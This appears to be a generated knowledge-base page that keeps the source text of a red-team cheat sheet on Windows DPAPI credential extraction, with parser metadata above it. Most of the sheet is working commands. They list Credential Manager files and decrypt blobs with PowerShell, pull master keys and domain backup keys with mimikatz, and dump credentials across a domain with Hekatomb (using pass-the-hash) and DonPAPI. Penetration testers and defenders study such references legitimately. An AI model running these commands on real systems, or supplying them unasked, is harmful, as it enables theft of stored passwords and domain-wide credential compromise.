---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Windows - DPAPI

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-evasion-windows-dpapi` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/evasion/windows-dpapi.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Windows - DPAPI](../../topics/redteam/windows-dpapi.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-evasion-windows-dpapi |
| name | Windows - DPAPI |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/evasion/windows-dpapi.md |

## Preserved Source Material

````yaml
_body: "# Windows - DPAPI\n\n> On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft's\
  \ Data Protection API and stored as \"blob\" files in user AppData folder.\n\n## Summary\n\n* [Data Protection API](#data-protection-api)\n\
  \    * [List Credential Files](#list-credential-files)\n    * [DPAPI LocalMachine Context](#dpapi-localmachine-context)\n\
  \    * [Mimikatz - Credential Manager & DPAPI](#mimikatz---credential-manager--dpapi)\n    * [Hekatomb - Steal all credentials\
  \ on domain](#hekatomb---steal-all-credentials-on-domain)\n    * [DonPAPI - Dumping DPAPI credz remotely](#donpapi---dumping-dpapi-credz-remotely)\n\
  \n## Data Protection API\n\n* Outside of a domain: the user's `password hash` is used to encrypt these \"blobs\".\n* Inside\
  \ a domain: the `domain controller's master key` is used to encrypt these blobs.\n\nWith the extracted private key of the\
  \ domain controller, it is possible to decrypt all the blobs, and therefore to recover all the secrets recorded in the Windows\
  \ identification manager of all the work  \nstations in the domain.\n\n```ps1\nvaultcmd /list\n\nVaultCmd /listcreds:<namevault>|<guidvault>\
  \ /all\nvaultcmd /listcreds:\"Windows Credentials\" /all\n```\n\n### List Credential Files\n\n```ps1\ndir /a:h C:\\Users\\\
  username\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Credentials\\\
  \n\nGet-ChildItem -Hidden C:\\Users\\username\\AppData\\Local\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\\
  username\\AppData\\Roaming\\Microsoft\\Credentials\\\n```\n\n### DPAPI LocalMachine Context\n\nThe `LocalMachine` context\
  \ is used to protect data that is intended to be shared across different users or services on a single machine. This means\
  \ that any user or service running on the machine can access the protected data with the appropriate credentials.\n\nIn\
  \ contrast, the `CurrentUser` context is used to protect data that is intended to be accessed only by the user who encrypted\
  \ it, and cannot be accessed by other users or services on the same machine.\n\n```ps1\n$a = [System.Convert]::FromBase64String(\"\
  AQAAANCMnd[...]\")\n$b = [System.Security.Cryptography.ProtectedData]::Unprotect($a, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine)\n\
  [System.Text.Encoding]::ASCII.GetString($b)\n```\n\n### Mimikatz - Credential Manager & DPAPI\n\n```powershell\n# check\
  \ the folder to find credentials\ndir C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\*\n\n# check the file\
  \ with mimikatz\nmimikatz dpapi::cred /in:C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0\n\
  # find master key\nmimikatz !sekurlsa::dpapi\n# use master key\nmimikatz dpapi::cred /in:C:\\Users\\<username>\\AppData\\\
  Local\\Microsoft\\Credentials\\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b\n\
  \n# find and export backup keys\nlsadump::backupkeys /system:dc01.lab.local /export\n# use backup keys\ndpapi::masterkey\
  \ /in:\"C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-2552734371-813931464-1050690807-1106\\3e90dd9e-f901-40a1-b691-84d7f647b8fe\"\
  \ /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk\n```\n\n### Hekatomb - Steal all credentials on domain\n\n>\
  \ [ProcessusT/Hekatomb](https://github.com/ProcessusT/HEKATOMB) is a python script that connects to LDAP directory to retrieve\
  \ all computers and users informations. Then it will download all DPAPI blob of all users from all computers. Finally, it\
  \ will extract domain controller private key through RPC uses it to decrypt all credentials.\n\n```python\npip3 install\
  \ hekatomb\nhekatomb -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp\n```\n\n\
  ![Data in memory](https://github.com/ProcessusT/HEKATOMB/raw/main/.assets/github1.png)\n\n### DonPAPI - Dumping DPAPI credz\
  \ remotely\n\n* [login-securite/DonPAPI](https://github.com/login-securite/DonPAPI)\n\n```ps1\nDonPAPI.py domain/user:passw0rd@target\n\
  DonPAPI.py --hashes <LM>:<NT> domain/user@target\n\n# using domain backup key\ndpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip\n\
  python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list\n```\n\n## References\n\n* [DPAPI -\
  \ Extracting Passwords - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords)\n\
  * [DON PAPI, OU L’ART D’ALLER PLUS LOIN QUE LE DOMAIN ADMIN - LoginSecurité - CORTO GUEGUEN - 4 MARS 2022](https://www.login-securite.com/2022/03/04/don-papi-ou-lart-daller-plus-loin-que-le-avec-dpapi/)"
_relative_path: redteam/evasion/windows-dpapi.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/evasion/windows-dpapi.md
````
